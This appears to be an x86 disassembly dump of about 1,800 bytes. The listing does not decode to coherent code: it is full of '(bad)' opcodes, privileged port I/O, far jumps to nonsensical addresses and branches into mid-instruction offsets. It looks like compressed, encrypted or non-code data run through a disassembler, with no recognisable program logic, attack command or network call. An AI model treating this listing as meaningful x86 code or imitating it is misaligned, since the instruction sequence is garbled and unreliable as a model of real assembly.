  41db75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db76:	lahf   
  41db77:	mov    dh,0x61
  41db79:	jmp    0x98a4:0x7c66a018
  41db80:	retf   
  41db81:	jg     0x41db78
  41db83:	lods   al,BYTE PTR ds:[esi]
  41db84:	fwait
  41db85:	sbb    edx,DWORD PTR [ecx-0x23213cc4]
  41db8b:	xor    BYTE PTR [esi+0x5d],dl
  41db8e:	mov    ch,cl
  41db90:	retf   
  41db91:	add    DWORD PTR [ebp-0x651ab8af],edi
  41db97:	out    0xb0,eax
  41db99:	push   esp
  41db9a:	or     ah,BYTE PTR [ebx+0x7958c04e]
  41dba0:	hlt    
  41dba1:	inc    eax
  41dba2:	sub    al,0x88
  41dba4:	(bad)  
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	ret    
  41dba7:	xchg   ebx,eax
  41dba8:	and    al,0xc8
  41dbaa:	(bad)  
  41dbae:	fsub   DWORD PTR [esi]
  41dbb0:	add    eax,DWORD PTR [edi-0x1e]
  41dbb3:	mov    dh,0xcf
  41dbb5:	jl     0x41dbfc
  41dbb7:	mov    cl,0xf
  41dbb9:	sbb    dl,0x7
  41dbbc:	jg     0x41dbe3
  41dbbe:	jl     0x41db47
  41dbc0:	daa    
  41dbc1:	stos   BYTE PTR es:[edi],al
  41dbc2:	aas    
  41dbc3:	outs   dx,BYTE PTR ds:[esi]
  41dbc4:	push   edx
  41dbc5:	or     DWORD PTR [edi],ebp
  41dbc7:	push   es
  41dbc8:	mov    bl,0x22
  41dbca:	and    ah,BYTE PTR ds:0x83ea227c
  41dbd0:	sub    DWORD PTR [esi],edi
  41dbd2:	clc    
  41dbd3:	mov    dl,BYTE PTR [ecx]
  41dbd5:	cmp    eax,0x37395d2a
  41dbda:	mov    gs,WORD PTR [ebx-0x695cd734]
  41dbe0:	inc    esi
  41dbe1:	sub    BYTE PTR [edx+0x3bb0152],ch
  41dbe7:	cmp    cl,BYTE PTR [edx-0x17081443]
  41dbed:	jecxz  0x41dc1b
  41dbef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf0:	mov    dh,bl
  41dbf2:	(bad)  
  41dbf3:	stc    
  41dbf4:	pop    ecx
  41dbf5:	or     eax,DWORD PTR [edx]
  41dbf7:	or     eax,0x9f68e361
  41dbfc:	sahf   
  41dbfd:	dec    edx
  41dbfe:	scas   eax,DWORD PTR es:[edi]
  41dbff:	das    
  41dc00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc01:	dec    esp
  41dc02:	mov    WORD PTR [edi-0x4cea80b8],fs
  41dc08:	mov    ebx,0xfaaba9f9
  41dc0d:	cmp    al,0x3b
  41dc0f:	xor    DWORD PTR [edi],ebp
  41dc11:	pop    ds
  41dc12:	and    BYTE PTR [esi+0x603433e1],ah
  41dc18:	jle    0x41dc76
  41dc1a:	dec    ecx
  41dc1b:	ja     0x41dc68
  41dc1d:	clc    
  41dc1e:	sub    al,0x49
  41dc20:	das    
  41dc21:	pop    ds
  41dc22:	xchg   ebx,eax
  41dc23:	stos   DWORD PTR es:[edi],eax
  41dc24:	cli    
  41dc25:	xchg   BYTE PTR [ecx-0x6c2c1a47],al
  41dc2b:	js     0x41dbdf
  41dc2d:	mov    WORD PTR [ecx-0x7f],fs
  41dc30:	stos   BYTE PTR es:[edi],al
  41dc31:	cmp    al,0x1e
  41dc33:	in     al,dx
  41dc34:	pop    ss
  41dc35:	popw   ss
  41dc37:	dec    eax
  41dc38:	and    DWORD PTR [ebx-0x24],ecx
  41dc3b:	adc    eax,DWORD PTR [esi-0x75dcee88]
  41dc41:	outs   dx,DWORD PTR ds:[esi]
  41dc42:	add    BYTE PTR [edx+0x29],cl
  41dc45:	mov    bl,0xd4
  41dc47:	adc    ah,bh
  41dc49:	retf   
  41dc4a:	gs ror edx,0x33
  41dc4e:	aas    
  41dc4f:	imul   esp,DWORD PTR [edi],0x6e10e91
  41dc55:	mov    BYTE PTR [eax+0x252708d4],bh
  41dc5b:	(bad)  
  41dc5c:	dec    edx
  41dc5d:	sub    esp,DWORD PTR [ecx+ebx*1+0x3ec64129]
  41dc64:	xchg   ebp,eax
  41dc65:	shl    DWORD PTR [esi-0x2b3518b7],cl
  41dc6b:	(bad)  
  41dc6c:	mov    edx,DWORD PTR [esi+eiz*4]
  41dc6f:	xlat   BYTE PTR ds:[ebx]
  41dc70:	pushf  
  41dc71:	aam    0xae
  41dc73:	clc    
  41dc74:	in     eax,dx
  41dc75:	xor    ah,BYTE PTR [eax]
  41dc77:	fst    QWORD PTR [ebx-0x615acf94]
  41dc7d:	adc    cl,BYTE PTR [ebx-0x49]
  41dc80:	dec    ecx
  41dc81:	push   ss
  41dc82:	jns    0x41dc78
  41dc84:	jp     0x41dccd
  41dc86:	push   ebp
  41dc87:	(bad)  
  41dc89:	pop    edx
  41dc8a:	data16 xlat BYTE PTR ds:[ebx]
  41dc8c:	aad    0x8e
  41dc8e:	std    
  41dc8f:	mov    ebx,0x4e188c8e
  41dc94:	pop    edi
  41dc95:	leave  
  41dc96:	pusha  
  41dc97:	outs   dx,DWORD PTR ds:[esi]
  41dc98:	cmp    ebx,eax
  41dc9a:	jmp    0x41dc6c
  41dc9c:	stos   BYTE PTR es:[edi],al
  41dc9d:	dec    esi
  41dc9e:	mov    bh,0xde
  41dca0:	arpl   WORD PTR [ebx+edx*1+0x7adb55c7],sp
  41dca7:	sar    DWORD PTR [eax+0x6b],0x19
  41dcab:	inc    ecx
  41dcac:	mov    ds:0x325555d9,eax
  41dcb1:	pop    ebx
  41dcb2:	mov    edi,0xfbb5e179
  41dcb7:	push   0x14
  41dcb9:	and    BYTE PTR [ebx-0x2fe62d27],ch
  41dcbf:	mov    edi,0xb3d8f85a
  41dcc4:	xchg   esp,eax
  41dcc5:	jb     0x41dc95
  41dcc7:	popf   
  41dcc8:	add    BYTE PTR [edx],0x61
  41dccb:	add    edx,DWORD PTR [edx+edx*4-0x5e]
  41dccf:	adc    al,0xf1
  41dcd1:	add    DWORD PTR ds:[esi],ebp
  41dcd4:	mov    ebp,0x416c5c5
  41dcd9:	push   es
  41dcda:	add    DWORD PTR [ebp+0x59],edx
  41dcdd:	sbb    al,0xf4
  41dcdf:	mov    esi,0x753b9273
  41dce4:	sti    
  41dce5:	mov    ds:0x3d61cf25,eax
  41dcea:	pop    es
  41dceb:	cmp    ebx,DWORD PTR [bx+0x31a1]
  41dcf0:	and    al,0xc0
  41dcf2:	clc    
  41dcf3:	mov    dl,0xa8
  41dcf5:	or     al,0x46
  41dcf7:	xchg   edi,eax
  41dcf8:	mov    edi,0x123546f5
  41dcfd:	lock ins BYTE PTR es:[edi],dx
  41dcff:	inc    edx
  41dd00:	mov    ah,0x62
  41dd02:	mov    ecx,0xcf83e86a
  41dd07:	clc    
  41dd08:	jmp    0x20d36197
  41dd0d:	gs inc eax
  41dd0f:	stos   DWORD PTR es:[edi],eax
  41dd10:	(bad)  
  41dd11:	arpl   WORD PTR [esi],ax
  41dd13:	xor    eax,0xb449ac08
  41dd18:	cmc    
  41dd19:	ins    DWORD PTR es:[edi],dx
  41dd1a:	inc    DWORD PTR [eax+0x5a]
  41dd1d:	(bad)  
  41dd1e:	pop    ebp
  41dd1f:	sub    eax,0x72196149
  41dd24:	imul   edi
  41dd26:	cmp    dl,BYTE PTR [ecx-0x2]
  41dd29:	and    eax,0xe63aa0e7
  41dd2e:	dec    eax
  41dd2f:	div    DWORD PTR [edi+0x6b95df71]
  41dd35:	pop    ebp
  41dd36:	repnz fsub DWORD PTR [edi+eax*8+0x22439240]
  41dd3e:	pusha  
  41dd3f:	jb     0x41dd37
  41dd41:	jns    0x41dcf3
  41dd43:	ret    0xd260
  41dd46:	fnstenv [edi-0x1]
  41dd49:	(bad)  
  41dd4a:	fstp   DWORD PTR [ecx]
  41dd4c:	in     eax,0x97
  41dd4e:	hlt    
  41dd4f:	pusha  
  41dd50:	je     0x41dd34
  41dd52:	mov    ds:0x3c3fb48a,al
  41dd57:	mov    edx,0xc01770f7
  41dd5c:	loop   0x41dd5c
  41dd5e:	(bad)  
  41dd5f:	out    dx,eax
  41dd60:	inc    esp
  41dd61:	cmp    ah,BYTE PTR [eax]
  41dd63:	repnz stos DWORD PTR es:[edi],eax
  41dd65:	or     al,0x3a
  41dd67:	jmp    0xa1475e9f
  41dd6c:	sub    al,0x63
  41dd6e:	mov    dh,0x6
  41dd70:	cli    
  41dd71:	jbe    0x41ddaf
  41dd73:	iret   
  41dd74:	push   0xffffffd5
  41dd76:	ins    BYTE PTR es:[edi],dx
  41dd77:	sbb    eax,0x3ef567e3
  41dd7c:	std    
  41dd7d:	jmp    0x3e0e:0xee73f096
  41dd84:	jne    0x41dd6e
  41dd86:	push   edi
  41dd87:	das    
  41dd88:	packsswb mm2,QWORD PTR [ecx+0x460ed2cd]
  41dd8f:	or     ebp,ecx
  41dd91:	arpl   WORD PTR [esi-0x11],di
  41dd94:	or     eax,0xe508acb3
  41dd99:	mov    ch,0x2d
  41dd9b:	inc    esp
  41dd9c:	mov    ebp,0x61ab7925
  41dda1:	adc    dh,BYTE PTR [edi]
  41dda3:	sbb    DWORD PTR [edx+0x1c],0xffffffe5
  41dda7:	pop    ebp
  41dda8:	add    DWORD PTR [ebx],ebx
  41ddaa:	and    BYTE PTR [eax+0x500fe0b2],dh
  41ddb0:	fst    st(2)
  41ddb2:	xor    BYTE PTR [esi+0x13],cl
  41ddb5:	jae    0x41dd56
  41ddb7:	sbb    esp,esi
  41ddb9:	out    dx,al
  41ddba:	test   al,0x21
  41ddbc:	mov    ecx,0x2fec36f4
  41ddc1:	outs   dx,DWORD PTR ds:[esi]
  41ddc2:	icebp  
  41ddc3:	pop    ebp
  41ddc4:	adc    eax,0xc1c54d2c
  41ddc9:	es ss jno 0x41dd4e
  41ddcd:	mov    dl,0x9
  41ddcf:	hlt    
  41ddd0:	pop    es
  41ddd1:	pop    cx
  41ddd3:	inc    ecx
  41ddd4:	(bad)  
  41ddd5:	ins    BYTE PTR es:[edi],dx
  41ddd6:	aam    0xb2
  41ddd8:	jbe    0x41dd6b
  41ddda:	xchg   ch,cl
  41dddc:	mov    ecx,0xdb7e51fc
  41dde1:	fimul  WORD PTR [esi+0x57]
  41dde4:	fdiv   QWORD PTR [edx]
  41dde6:	fild   QWORD PTR [eax]
  41dde8:	cmp    eax,0x6b4cdbfc
  41dded:	cmp    DWORD PTR [edx],ecx
  41ddef:	mov    eax,ds:0xa1c0c57f
  41ddf4:	out    dx,eax
  41ddf5:	daa    
  41ddf6:	cmp    eax,0xa548c72b
  41ddfb:	packuswb mm7,QWORD PTR [esi-0x53]
  41ddff:	inc    esp
  41de00:	mov    ebx,0x97e50774
  41de05:	iret   
  41de06:	inc    edi
  41de07:	or     dl,BYTE PTR [ebp+0x522511ec]
  41de0d:	inc    edx
  41de0e:	xchg   ebx,eax
  41de0f:	fwait
  41de10:	mov    cl,0xfb
  41de12:	dec    edx
  41de13:	push   0xffffffc9
  41de15:	ds adc dh,bh
  41de18:	add    dh,BYTE PTR [ecx-0x47]
  41de1b:	jl     0x41de7b
  41de1d:	dec    esi
  41de1e:	sub    al,0x21
  41de20:	or     BYTE PTR [esi+ecx*2],dh
  41de23:	fcomip st,st(7)
  41de25:	pop    esp
  41de26:	and    DWORD PTR [edx+0x27],edi
  41de29:	fcomp  DWORD PTR [ecx+0xab747a8]
  41de2f:	cmp    bh,BYTE PTR ds:0x993413ed
  41de35:	aad    0x11
  41de37:	cmp    ecx,DWORD PTR [ebx]
  41de39:	daa    
  41de3a:	xchg   DWORD PTR [ecx+0x35902dda],esi
  41de40:	jg     0x41deb2
  41de42:	mov    edi,0x5cb7062a
  41de47:	fisubr WORD PTR [ebp+0x5a5715bf]
  41de4d:	mov    dh,0x11
  41de4f:	leave  
  41de50:	pop    ss
  41de51:	dec    ebp
  41de52:	cmp    bl,BYTE PTR [ecx-0x4a]
  41de55:	mov    al,BYTE PTR [ecx]
  41de57:	mov    ecx,0x67b4058
  41de5c:	jecxz  0x41de78
  41de5e:	mov    eax,0xb29b9051
  41de63:	outs   dx,DWORD PTR ds:[esi]
  41de64:	inc    ecx
  41de65:	push   ecx
  41de66:	not    BYTE PTR [eax-0x48400907]
  41de6c:	cmc    
  41de6d:	xchg   ebx,eax
  41de6e:	jae    0x41de97
  41de70:	cmp    ebx,DWORD PTR [ecx-0xd4d5a2]
  41de76:	mov    cl,0xb4
  41de78:	les    esp,FWORD PTR [esi+esi*2-0x54]
  41de7c:	rcr    esp,0xb9
  41de7f:	mov    BYTE PTR [eax-0x446bd361],dl
  41de85:	add    DWORD PTR [edx],ebp
  41de87:	(bad)  
  41de88:	mov    ds:0x4e2afb9c,al
  41de8d:	inc    edi
  41de8e:	cmp    eax,0xdba53e5
  41de93:	push   edx
  41de94:	rcr    DWORD PTR [eax-0x45],1
  41de97:	push   eax
  41de98:	(bad)  
  41de99:	cld    
  41de9a:	jb     0x41de8d
  41de9c:	push   cs
  41de9d:	call   0xa8f9102c
  41dea2:	dec    eax
  41dea3:	retf   0xf275
  41dea6:	sbb    al,0x3a
  41dea8:	jle    0x41df09
  41deaa:	(bad)  
  41deab:	aaa    
  41deac:	in     al,0xc3
  41deae:	mov    ah,0x68
  41deb0:	pop    esi
  41deb1:	cwde   
  41deb2:	or     BYTE PTR [eax-0x6de23c23],bl
  41deb8:	push   ds
  41deb9:	loope  0x41def4
  41debb:	mov    gs,WORD PTR [ebp+0x5c753f28]
  41dec1:	xlat   BYTE PTR ds:[ebx]
  41dec2:	ror    DWORD PTR [edi-0x16],cl
  41dec5:	xlat   BYTE PTR ds:[ebx]
  41dec6:	loop   0x41df18
  41dec8:	pop    ss
  41dec9:	jno    0x41df0c
  41decb:	push   cs
  41decc:	das    
  41decd:	jmp    0xb53b:0x231eb140
  41ded4:	jo     0x41dee5
  41ded6:	push   ebp
  41ded7:	dec    eax
  41ded8:	in     eax,dx
  41ded9:	sbb    DWORD PTR [esi],esi
  41dedb:	dec    eax
  41dedc:	repz daa 
  41dede:	pop    esi
  41dedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee0:	xchg   BYTE PTR [eax+0x21],bl
  41dee3:	fdivrp st(0),st
  41dee5:	mov    dl,0x50
  41dee7:	cmc    
  41dee8:	stos   DWORD PTR es:[edi],eax
  41dee9:	ins    DWORD PTR es:[edi],dx
  41deea:	xor    eax,0x4b0f1ae5
  41deef:	rcr    BYTE PTR [eax],0x8
  41def2:	push   eax
  41def3:	int3   
  41def4:	lahf   
  41def5:	xchg   BYTE PTR [edx+0x53080346],bl
  41defb:	inc    edx
  41defc:	sar    DWORD PTR [ebx+0x6d],1
  41deff:	addr16 sub esp,ecx
  41df02:	xor    eax,0x1a42e0df
  41df07:	les    esp,FWORD PTR [edi-0x4e]
  41df0a:	je     0x41df37
  41df0c:	bound  ebp,QWORD PTR [ebx+ebx*4]
  41df0f:	mov    al,0x21
  41df11:	and    DWORD PTR [edi+eax*8+0x29af1594],ecx
  41df18:	mov    cl,0x2e
  41df1a:	imul   esp,DWORD PTR [edx-0x13],0x80a9506d
  41df21:	out    0xfe,al
  41df23:	nop
  41df24:	jbe    0x41df4e
  41df26:	fisttp DWORD PTR [edi+0x43354d44]
  41df2c:	xchg   DWORD PTR [edi],ebp
  41df2e:	sbb    BYTE PTR [esi+0x69],ah
  41df31:	pop    esp
  41df32:	add    al,0xbc
  41df34:	fld    st(7)
  41df36:	push   esp
  41df37:	(bad)  
  41df38:	mov    ch,0xbf
  41df3a:	cld    
  41df3b:	mov    al,0x5a
  41df3d:	jno    0x41df9e
  41df3f:	stos   DWORD PTR es:[edi],eax
  41df40:	jmp    0x41df47
  41df42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df43:	cmp    ah,BYTE PTR ds:[edi]
  41df46:	mov    eax,0x7e4437dd
  41df4b:	loope  0x41df5c
  41df4d:	nop
  41df4e:	jo     0x41df3d
  41df50:	imul   eax,DWORD PTR [ebp-0x4346f750],0xe
  41df57:	fsubr  QWORD PTR [edi+0x132d17c8]
  41df5d:	sub    DWORD PTR [edi-0x6a],0x25
  41df61:	int3   
  41df62:	(bad)  
  41df63:	pop    edi
  41df64:	inc    esi
  41df65:	push   ds
  41df66:	aaa    
  41df67:	pushf  
  41df68:	dec    eax
  41df69:	dec    edx
  41df6a:	adc    eax,0xd3200659
  41df6f:	cmc    
  41df70:	call   0x3e9baabb
  41df75:	jae    0x41df14
  41df77:	pop    edi
  41df78:	fild   QWORD PTR [eax]
  41df7a:	cmc    
  41df7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df7c:	fstp   DWORD PTR [ecx+esi*1]
  41df7f:	pop    esi
  41df80:	xor    eax,0x31c1328c
  41df85:	fld    TBYTE PTR [ebp-0x42]
  41df88:	mov    DWORD PTR [ecx+ecx*4-0x7bbc3844],0x521021b5
  41df93:	hlt    
  41df94:	enter  0x9e2d,0x2f
  41df98:	daa    
  41df99:	cmc    
  41df9a:	cdq    
  41df9b:	mov    bl,0xae
  41df9d:	dec    ebp
  41df9e:	cs retf 0xacf1
  41dfa2:	clc    
  41dfa3:	adc    eax,DWORD PTR [edx-0x46]
  41dfa6:	aad    0x90
  41dfa8:	popf   
  41dfa9:	dec    ebx
  41dfaa:	xor    DWORD PTR ss:[ebp-0x30603af2],ebp
  41dfb1:	push   es
  41dfb2:	es mov dl,0x28
  41dfb5:	test   al,bl
  41dfb7:	packssdw mm1,QWORD PTR [edi+ecx*4]
  41dfbb:	jae    0x41df68
  41dfbd:	in     ax,dx
  41dfbf:	stos   BYTE PTR es:[edi],al
  41dfc0:	imul   ebp,DWORD PTR [eax],0xffffffb5
  41dfc3:	push   cs
  41dfc4:	inc    edx
  41dfc5:	call   0x19d8:0xa61d6741
  41dfcc:	or     al,0x3f
  41dfce:	mov    dh,0xf6
  41dfd0:	push   0x4c020f70
  41dfd5:	mov    ebx,DWORD PTR [eax]
  41dfd7:	push   ss
  41dfd8:	popf   
  41dfd9:	inc    edi
  41dfda:	xor    BYTE PTR [esi+0x4c],bl
  41dfdd:	div    BYTE PTR [edi+0x72feac0d]
  41dfe3:	pusha  
  41dfe4:	mov    ah,BYTE PTR [eax+0x6b]
  41dfe7:	xor    eax,0xf30a318c
  41dfec:	mov    esi,0x1aa288e7
  41dff1:	call   0x4c79dc9d
  41dff6:	mov    ds:0x3b7a6cda,eax
  41dffb:	cdq    
  41dffc:	(bad)  
  41dffd:	ss pop esp
  41dfff:	jp     0x41e015
  41e001:	push   cs
  41e002:	pop    esp
  41e003:	jo     0x41e062
  41e005:	mov    ebx,0x481c1d26
  41e00a:	xchg   ebx,eax
  41e00b:	or     bl,BYTE PTR [esi+eiz*2]
  41e00e:	mov    DWORD PTR gs:[ebx+0x6d3e9055],ebx
  41e015:	push   0xffffffec
  41e017:	jmp    0x4e8bcfa3
  41e01c:	cmp    BYTE PTR [ebp+0x1a],ah
  41e01f:	xchg   DWORD PTR [edx-0x3e044e74],ecx
  41e025:	jmp    0x41e049
  41e027:	push   es
  41e028:	and    ebx,edi
  41e02a:	leave  
  41e02b:	inc    ecx
  41e02c:	cld    
  41e02d:	enter  0x97ac,0x5
  41e031:	add    eax,0x664a34ea
  41e036:	xchg   al,dh
  41e038:	jle    0x41e00e
  41e03a:	adc    eax,0xd7c5dc92
  41e03f:	jns    0x41e096
  41e041:	push   ecx
  41e042:	daa    
  41e043:	outs   dx,DWORD PTR ds:[esi]
  41e044:	mov    WORD PTR [ecx-0x44],gs
  41e047:	lds    edx,FWORD PTR [eax-0x7c]
  41e04a:	not    BYTE PTR [edi+0x3]
  41e04d:	sbb    al,0xcd
  41e04f:	or     DWORD PTR [edx+edi*1+0x5d],0xb9a71e07
  41e057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e058:	repz add DWORD PTR [edi+0xba0cc6e],ebx
  41e05f:	addr16 test eax,0x891afea6
  41e065:	mov    ah,0xd4
  41e067:	retf   0x4e50
  41e06a:	xor    eax,0x9e9b0418
  41e06f:	jmp    0x41e048
  41e071:	adc    al,0x9a
  41e073:	jmp    0xbeca0ca7
  41e078:	leave  
  41e079:	adc    edi,DWORD PTR [edi+0x62]
  41e07c:	popa   
  41e07d:	mov    eax,ds:0x362d3806
  41e082:	cmp    DWORD PTR [edx+0x2cc94f34],0x34
  41e089:	aam    0xf5
  41e08b:	adc    BYTE PTR [esi-0x72],0xe2
  41e08f:	retf   
  41e090:	or     edx,edi
  41e092:	dec    edx
  41e093:	mov    eax,0x90e03af3
  41e098:	sti    
  41e099:	cld    
  41e09a:	out    dx,al
  41e09b:	aas    
  41e09c:	push   edi
  41e09d:	mov    esp,0xfaf03e44
  41e0a2:	and    eax,edi
  41e0a4:	mov    dl,0x4a
  41e0a6:	jmp    0x4722ac99
  41e0ab:	fstp   QWORD PTR [edi-0x151fe34]
  41e0b1:	cld    
  41e0b2:	(bad)  
  41e0b3:	in     eax,0x5a
  41e0b5:	sub    BYTE PTR [eax-0x7b],bl
  41e0b8:	ins    BYTE PTR es:[edi],dx
  41e0b9:	fld    DWORD PTR ds:0xd678300c
  41e0bf:	leave  
  41e0c0:	fidivr DWORD PTR [ebx+0x2693d03]
  41e0c6:	(bad)  
  41e0c7:	jnp    0x41e0f0
  41e0c9:	cmp    al,BYTE PTR ds:[edx+0x36]
  41e0cd:	fwait
  41e0ce:	dec    esi
  41e0cf:	pop    ebp
  41e0d0:	xor    ecx,DWORD PTR [esi-0x10]
  41e0d3:	xchg   edi,eax
  41e0d4:	out    0x3a,al
  41e0d6:	ins    WORD PTR es:[edi],dx
  41e0d8:	ins    BYTE PTR es:[edi],dx
  41e0d9:	retf   0xef3b
  41e0dc:	mov    al,ds:0xdbbe1f34
  41e0e1:	jge    0x41e156
  41e0e3:	test   eax,0x51551835
  41e0e8:	(bad)  
  41e0e9:	jmp    0x23a0f3f1
  41e0ee:	arpl   si,di
  41e0f0:	mov    ecx,0x23dc7bc4
  41e0f5:	push   es
  41e0f6:	adc    bh,BYTE PTR [esp+ecx*2]
  41e0f9:	arpl   WORD PTR [ecx],ax
  41e0fb:	scas   al,BYTE PTR es:[edi]
  41e0fc:	stos   DWORD PTR es:[edi],eax
  41e0fd:	push   0x15
  41e0ff:	xor    bh,cl
  41e101:	out    dx,eax
  41e102:	xor    DWORD PTR [edi-0x6],0x2480d7e4
  41e109:	les    eax,FWORD PTR [ebx]
  41e10b:	xor    DWORD PTR [ebx],esp
  41e10d:	ja     0x41e09d
  41e10f:	add    DWORD PTR [edi+edx*2-0x3d542618],0x4f
  41e117:	fld    QWORD PTR [esi+0xf30865]
  41e11d:	jae    0x41e0f5
  41e11f:	jecxz  0x41e18d
  41e121:	sahf   
  41e122:	add    ah,BYTE PTR [ebx+0x3e]
  41e125:	imul   edi,DWORD PTR [edi+0x475276d8],0xffffffae
  41e12c:	(bad)  
  41e12d:	(bad)  
  41e12f:	(bad)  
  41e132:	cwde   
  41e133:	inc    esi
  41e134:	test   eax,0x27a6da74
  41e139:	mov    ebx,0x1c8897b0
  41e13e:	cmp    DWORD PTR [ebp-0x71],esi
  41e141:	(bad)
  41e144:	add    ah,al
  41e146:	and    edi,0x7e582648
  41e14c:	lahf   
  41e14d:	leave  
  41e14e:	into   
  41e14f:	inc    esi
  41e150:	adc    esi,DWORD PTR [edi]
  41e152:	push   0xffffffbd
  41e154:	lock jnp 0x41e15f
  41e157:	call   0xa4a9:0x97768b3b
  41e15e:	cmp    eax,0xa7ce63
  41e163:	pop    esi
  41e164:	jns    0x41e173
  41e166:	and    eax,0x7e695d1
  41e16b:	lods   al,BYTE PTR ds:[esi]
  41e16c:	popf   
  41e16d:	mov    WORD PTR [edi+0x6e],es
  41e170:	dec    ebp
  41e171:	xchg   esp,eax
  41e172:	or     ah,cl
  41e174:	dec    edx
  41e175:	inc    ebx
  41e176:	mov    bh,0xa7
  41e178:	out    dx,al
  41e179:	sti    
  41e17a:	dec    ebp
  41e17b:	scas   al,BYTE PTR es:[edi]
  41e17c:	aam    0x92
  41e17e:	push   es
  41e17f:	inc    ecx
  41e180:	and    DWORD PTR [edi-0x1fdc8b3c],edx
  41e186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e188:	mov    dh,0x1c
  41e18a:	aaa    
  41e18b:	xchg   ebp,eax
  41e18c:	or     al,0xbe
  41e18e:	xor    ebx,DWORD PTR [ebx]
  41e190:	mov    ecx,0xfee1a2bf
  41e195:	rol    BYTE PTR [edi],1
  41e197:	adc    dh,BYTE PTR fs:[eax+esi*2-0x79]
  41e19c:	sahf   
  41e19d:	inc    edx
  41e19e:	or     BYTE PTR [eax-0x5fdf0718],al
  41e1a4:	hlt    
  41e1a5:	call   0xafcf:0xa110660f
  41e1ac:	add    eax,DWORD PTR [eax]
  41e1ae:	mov    ebx,0x8dbdacc7
  41e1b3:	fcmovnbe st,st(0)
  41e1b5:	push   ss
  41e1b6:	je     0x41e19f
  41e1b8:	icebp  
  41e1b9:	mov    bh,0x4c
  41e1bb:	mov    fs,WORD PTR [edi]
  41e1bd:	leave  
  41e1be:	sahf   
  41e1bf:	loop   0x41e226
  41e1c1:	xchg   dl,cl
  41e1c3:	adc    dl,BYTE PTR [ecx+0x40]
  41e1c6:	mov    ebx,eax
  41e1c8:	jo     0x41e1a9
  41e1ca:	xor    DWORD PTR [edx+0x31],ebp
  41e1cd:	or     al,0x7
  41e1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d0:	pop    ecx
  41e1d1:	retf   0x5d87
  41e1d4:	and    eax,0x37be4152
  41e1da:	adc    DWORD PTR [edx],eax
  41e1dc:	push   cs
  41e1dd:	sub    al,BYTE PTR [ebx]
  41e1df:	push   ecx
  41e1e0:	pop    esp
  41e1e1:	dec    ebx
  41e1e2:	xchg   ebx,eax
  41e1e3:	mov    BYTE PTR [ebp+ecx*1+0x6d35bbdf],ah
  41e1ea:	xor    BYTE PTR [ecx+esi*2-0x47e0d4d0],ah
  41e1f1:	loope  0x41e220
  41e1f3:	mov    ds:0x5ae0483e,eax
  41e1f8:	sbb    ah,BYTE PTR ds:0xdb2e190d
  41e1fe:	outs   dx,DWORD PTR ds:[esi]
  41e1ff:	add    al,0x9
  41e201:	ret    0x2d71
  41e204:	sub    al,0x4e
  41e206:	cld    
  41e207:	stos   BYTE PTR es:[edi],al
  41e208:	inc    ebp
  41e209:	ss or  al,0xf5
  41e20c:	test   al,0xa4
  41e20e:	int3   
  41e20f:	adc    ch,BYTE PTR [ebp-0x77]
  41e212:	imul   ebp,esi,0xb1906930
  41e218:	mov    DWORD PTR [edx],0x91b26070
  41e21e:	push   eax
  41e21f:	aaa    
  41e220:	in     eax,dx
  41e221:	jmp    0x41e243
  41e223:	in     al,0x8b
  41e225:	into   
  41e226:	fbstp  TBYTE PTR [edx]
  41e228:	and    esp,DWORD PTR [ebx-0x40eed4de]
  41e22e:	loope  0x41e251
  41e230:	(bad)  
  41e231:	push   edx
  41e232:	cmp    dh,dl
  41e234:	xchg   ecx,eax
  41e235:	shl    DWORD PTR [ecx+0x19],0x20
  41e239:	xchg   dl,bl
  41e23b:	sub    esi,DWORD PTR [di+0x2c]
  41e23f:	pop    ebx
  41e240:	imul   edx,DWORD PTR ds:[ecx-0x698d531b],0x70
  41e248:	adc    ecx,edi
  41e24a:	and    dh,0x34
  41e24d:	movzx  ebp,BYTE PTR [ebx+0x28]
  41e251:	dec    esp
  41e252:	adc    DWORD PTR [ecx],eax
  41e254:	sbb    DWORD PTR [ecx*1-0x5c0d6691],ebx
  41e25b:	pop    ecx
  41e25c:	adc    DWORD PTR [edi],ecx
  41e25e:	loopne 0x41e232
  41e260:	(bad)  
  41e261:	into   
  41e262:	sub    eax,0x50228711
  41e267:	daa    
  41e268:	jmp    0x5881c60f
  41e26d:	mov    bh,0xaf
  41e26f:	arpl   WORD PTR [eax+0x46e3d665],di
  41e275:	sub    eax,DWORD PTR [edx]
  41e277:	sbb    al,0xba
  41e279:	test   al,dl
  41e27b:	mov    ebp,0x7384bb89
  41e280:	adc    DWORD PTR [esi],edx
  41e282:	pop    ecx
  41e283:	jp     0x41e2c9
  41e285:	mov    edx,0x3f0439ee
  41e28a:	(bad)  
  41e28b:	popa   
  41e28c:	jbe    0x41e23c
  41e28e:	mov    DWORD PTR [ecx+eiz*2+0x3e],edx
  41e292:	mov    ah,BYTE PTR [edx]
  41e294:	xor    esp,DWORD PTR ds:0x549951b2
  41e29a:	mov    WORD PTR [ecx],es
  41e29c:	jo     0x41e2c5
  41e29e:	stc    
  41e29f:	shl    DWORD PTR [esi+0x45ed0726],0x21
  41e2a6:	fnstenv [edx-0x4d89947c]
  41e2ac:	dec    ebx
  41e2ad:	mov    esi,0x28078fc6
  41e2b2:	dec    ebx
  41e2b3:	and    eax,ebp
  41e2b5:	(bad)  
  41e2b6:	sub    dl,BYTE PTR [ecx]
  41e2b8:	scas   al,BYTE PTR es:[edi]
  41e2b9:	clc    
  41e2ba:	clc    
  41e2bb:	inc    ebx
  41e2bc:	and    BYTE PTR [ebx-0x4e],cl
  41e2bf:	sahf   
  41e2c0:	sahf   
  41e2c1:	and    ebp,eax
  41e2c3:	sub    eax,0x52865949
  41e2c8:	cmp    al,0xf8
  41e2ca:	jns    0x41e2bc
  41e2cc:	daa    
  41e2cd:	xchg   edx,eax
  41e2ce:	pop    eax
  41e2cf:	mov    bl,0xef
  41e2d1:	mov    ebp,0x79485620
  41e2d6:	loop   0x41e310
  41e2d8:	sbb    edi,DWORD PTR [ecx]
  41e2da:	push   0xffffffda
